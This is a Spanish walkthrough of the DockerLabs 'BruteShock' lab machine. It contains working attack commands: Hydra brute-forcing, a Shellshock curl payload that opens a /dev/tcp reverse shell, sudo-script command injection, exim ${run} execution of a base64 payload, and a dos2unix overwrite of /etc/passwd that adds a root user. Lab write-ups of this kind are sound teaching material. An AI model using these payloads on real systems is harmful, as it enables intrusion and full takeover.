@@ -1,0 +1,266 @@
+---
+title: BruteShock
+description: Resolución completa de la máquina virtual *BruteShock* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **BruteShock**, desarrollada por *maciiii___* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un formulario de login vulnerable a ataques de fuerza bruta, permitiendo obtener credenciales de acceso. Tras autenticarse, se descubre un endpoint vulnerable a **Shellshock (CVE-2014-6271)**, que permite la ejecución remota de comandos y la obtención de una reverse shell como `www-data`.
+Una vez dentro, se encadenan múltiples vectores de escalada: craqueo de un hash de `/etc/shadow` para acceder a `darksblack`, inyección de comandos en un script para escalar a `maci`, abuso de `exim` con sudo para acceder a `pepe`, y finalmente modificación de `/etc/passwd` mediante `dos2unix` para crear un usuario con privilegios `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'BruteShock',
+    Autor: 'maciiii___',
+    Dificultad: 'Media',
+    Fecha: '12/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip BruteShock.zip
+sudo bash auto_deploy.sh BruteShock.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p BruteShock/{content,exploits,nmap,scripts}
+cd BruteShock
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1771383061/Ports_zrctd2.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+Solo se identifica el index, que redirige a un formulario de login:
+
+![Login form](https://res.cloudinary.com/dewqswzke/image/upload/v1771383060/Index_jcank0.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Fuerza bruta en formulario de login
+
+No se encuentran inyecciones SQL ni otros vectores. Se realiza un ataque de fuerza bruta con Hydra:
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/:username=^USER^&password=^PASS^:H=Cookie:PHPSESSID=8ehi7afsn6bsuvem2qurqk822q:F=Credenciales incorrectas" -t 64 -I -f
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1771383060/Hydra_y0x7dn.png)
+
+### 2.2 Shellshock (CVE-2014-6271)
+
+Tras autenticarse, se accede al endpoint `pruebasUltrasecretas`, que muestra un mensaje indicando que el User-Agent se almacena en logs, sugiriendo vulnerabilidad a **Shellshock**.
+
+Se prueba con un comando `sleep`:
+
+```bash
+curl 'http://172.17.0.2/pruebasUltrasecretas/' -H 'User-Agent: () { :;}; echo; sleep 5' | tail
+```
+
+La respuesta confirma la vulnerabilidad.
+
+### 2.3 Reverse shell
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se envía el payload:
+
+```bash
+curl 'http://172.17.0.2/pruebasUltrasecretas/' -H 'User-Agent: () { :;}; echo; /bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1"' | tail
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1771383064/ReverseShell_lezuqx.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → darksblack
+
+Se encuentra el archivo `/var/backups/darksblack/.darksblack.txt`, que contiene un extracto de `/etc/shadow` del usuario `darksblack`.
+
+Se copia la sección de `/etc/passwd` correspondiente y se usa `unshadow`:
+
+```bash
+unshadow passwd shadow > data.txt
+john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt data.txt
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1771383061/John_ap2kjs.png)
+
+Se obtiene la contraseña y se cambia al usuario:
+
+```bash
+su darksblack
+```
+
+### 3.2 De darksblack → maci
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l darksblack](https://res.cloudinary.com/dewqswzke/image/upload/v1771383064/Sudo-lDarksblack_xvz5k8.png)
+
+Se puede ejecutar `/home/maci/script.sh` como `maci`. El script tiene una entrada `read` sin sanitización.
+
+Se inyecta un comando:
+
+```bash
+sudo -u maci /home/maci/script.sh
+
+Adivina: test[$(/bin/bash -p >&2)]
+```
+
+![Maci](https://res.cloudinary.com/dewqswzke/image/upload/v1771383061/maci_vfhudn.png)
+
+### 3.3 De maci → pepe
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l maci](https://res.cloudinary.com/dewqswzke/image/upload/v1771383064/Sudo-lMaci_awv8on.png)
+
+Se puede ejecutar `exim` como `pepe`. Se inicia otro listener y se ejecuta:
+
+```bash
+sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "echo PayloadBase64 | base64 -d | bash"}}'
+```
+
+### 3.4 De pepe → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l pepe](https://res.cloudinary.com/dewqswzke/image/upload/v1771385569/Sudo-lPepe_ruunzo.png)
+
+Se puede ejecutar `dos2unix` como root. Se modifica `/etc/passwd` para crear un usuario con privilegios `root`:
+
+```bash
+cp /etc/passwd /tmp/passwd
+openssl passwd <password>
+echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /tmp/passwd
+sudo -u root /usr/bin/dos2unix -f -n "/tmp/passwd" "/etc/passwd"
+su - root2
+chown root:root /etc/passwd
+chmod 644 /etc/passwd
+```
+
+Con esto se ha obtenido un usuario con privilegios `root`.
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Login sin protección contra fuerza bruta",
+      severity: "Media",
+      impact: "Obtención de credenciales por diccionario"
+    },
+    {
+      vulnerability: "Endpoint vulnerable a Shellshock (CVE-2014-6271)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Almacenamiento de extracto de /etc/shadow en directorio accesible",
+      severity: "Alta",
+      impact: "Craqueo de contraseñas y acceso a usuario darksblack"
+    },
+    {
+      vulnerability: "Script con entrada de usuario sin sanitización",
+      severity: "Alta",
+      impact: "Escalada a maci mediante inyección de comandos"
+    },
+    {
+      vulnerability: "sudo para exim sin restricciones",
+      severity: "Crítica",
+      impact: "Escalada a pepe mediante ejecución arbitraria"
+    },
+    {
+      vulnerability: "sudo para dos2unix sobre /etc/passwd",
+      severity: "Crítica",
+      impact: "Modificación de archivo de autenticación y creación de usuario root"
+    }
+  ]}
+/>
